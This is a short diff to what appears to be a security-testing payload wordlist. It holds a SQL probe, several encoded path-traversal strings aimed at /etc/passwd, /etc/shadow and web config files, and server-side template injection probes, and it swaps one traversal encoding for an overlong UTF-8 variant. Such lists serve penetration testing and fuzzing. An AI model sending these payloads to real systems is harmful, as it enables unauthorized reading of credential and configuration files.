@@ -32,7 +32,7 @@ SELECT(username)FROM(USERS)WHERE(username='netspi')
 ../../../../var/www/html/conf.php
 ../../controller.php
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-%e0%40%aeetc%e0%40%aeshadow
+%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd%c0%2f
 {{2*2}}[[3*3]]
 {{3*'3'}}
 <%= 3 * 3 %>
